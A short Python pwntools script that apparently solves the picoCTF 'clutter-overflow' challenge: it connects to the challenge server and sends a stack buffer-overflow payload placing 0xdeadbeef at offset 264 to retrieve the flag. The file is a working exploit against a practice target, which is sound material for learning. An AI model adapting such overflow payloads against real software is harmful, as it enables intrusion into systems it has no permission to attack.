# picoCTF-clutter-overflow-exploit.py
# by Aidan Wech (ahwech)
# nc mars.picoctf.net 31890

from pwn import *

def main():
    # connection variables
    host = "mars.picoctf.net"
    port = 31890

    # variables
    # at offset we overwrite code to have value 0xdeadbeef
    offset = 264
    payload = flat(
        {offset: p64(0xdeadbeef)}
    )

    p = remote(host, port)

    # deliver payload
    p.recvuntil(b"see?\n", timeout=1)
    p.sendline(payload)

    # receive flag
    p.recvuntil(b"troubles\n", timeout=1)
    flag = p.recvline(timeout=1).decode().rstrip("\n")
    p.close()
    
    # reveal flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()